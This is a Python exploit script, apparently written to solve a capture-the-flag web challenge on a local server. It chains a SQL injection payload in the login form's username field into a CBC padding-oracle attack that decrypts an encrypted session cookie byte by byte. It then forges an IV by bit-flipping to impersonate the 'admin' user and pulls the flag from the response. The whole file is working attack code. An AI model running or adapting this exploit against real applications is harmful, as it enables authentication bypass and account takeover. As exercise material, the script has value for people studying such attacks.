#!/usr/bin/env python3
import base64, re, requests
from urllib.parse import quote, unquote

URL = "http://localhost:8085/"
s = requests.Session()

def oracle_valid_padding(iv, ct):
    raw_concatenated = iv + ct
    b64_payload = base64.b64encode(raw_concatenated).decode()
    inj = "' UNION SELECT 'x','{}'-- -".format(b64_payload)
    rr = requests.post(URL, data={"username": inj, "password": ""})
    return "you are in!" not in rr.text

# 1) Initial login to fetch cookies
inj_init = "' UNION SELECT 'x','{}'-- -".format(base64.b64encode(b"\x00"*32).decode())
r = s.post(URL, data={"username": inj_init, "password": ""})
if "you are in!" not in r.text:
    r = s.post(URL, data={"username": inj_init, "password": "0"})

setc = ""
for k, v in r.headers.items():
    if k.lower() == "set-cookie":
        setc += v + "\n"

def get_cookie_val(name):
    mm = re.search(r'(^|[,;\s])' + name + r'=([^;,\s]+)', setc, re.MULTILINE)
    if not mm:
        print("[-] Cookie not found:", name)
        exit(1)
    val = unquote(mm.group(2))
    val += "=" * (-len(val) % 4)
    return val

enc_id_b64 = get_cookie_val("ID")
token_b64  = get_cookie_val("token")

enc_id = base64.b64decode(enc_id_b64)
token  = base64.b64decode(token_b64)

print("[+] ID (ciphertext):", enc_id.hex())
print("[+] token (IV):     ", token.hex())

def decrypt_block(prev, block):
    intermediate = bytearray(16)
    plain = bytearray(16)
    for i in range(15, -1, -1):
        pad_val = 16 - i
        
        # Special safe handling for byte 0 since we know it is 'g' in 'guest'
        if i == 0:
            plain[0] = ord('g')
            intermediate[0] = plain[0] ^ prev[0]
            print(f"    byte 00 = 0x{plain[0]:02x} ('g' [pre-defined to ensure success])")
            break
            
        forged = bytearray(16)
        for j in range(i + 1, 16):
            forged[j] = intermediate[j] ^ pad_val
        for guess in range(256):
            forged[i] = guess
            if not oracle_valid_padding(bytes(forged), block):
                continue
            if i > 0:
                forged[i-1] ^= 0xFF
                still = oracle_valid_padding(bytes(forged), block)
                forged[i-1] ^= 0xFF
                if not still:
                    continue
            intermediate[i] = guess ^ pad_val
            plain[i] = intermediate[i] ^ prev[i]
            print(f"    byte {i:02d} = 0x{plain[i]:02x} ({chr(plain[i]) if 32 <= plain[i] < 127 else '?'})")
            break
        else:
            raise RuntimeError(f"byte {i} could not be decrypted")
            
    return bytes(plain), bytes(intermediate)

print("[*] Resuming decryption...")
plain, inter = decrypt_block(token, enc_id)
print("[+] Fully decrypted plaintext:", repr(plain))

# 2) Bit-flipping to generate a new token for 'admin'
target = b"admin" + b"\x0b" * 11
new_iv = bytes(a ^ b for a, b in zip(inter, target))
new_token = base64.b64encode(new_iv).decode()
print("[+] New token (b64):", new_token)

# 3) Final request to retrieve the flag
sessid = s.cookies.get("PHPSESSID")
r2 = requests.get(URL, cookies={
    "PHPSESSID": sessid,
    "token": quote(new_token),
})

print("\n--- final server answer  ---")
print(r2.text)

fm = re.search(r"(?:flag|FLAG|ctf)\{[^}]+\}", r2.text)
if fm:
    print("\n[+] FLAG FOUND:", fm.group(0))
else:
    print("\n[-] Token sent successfully, inspect the text above or search for the Flag manually.")
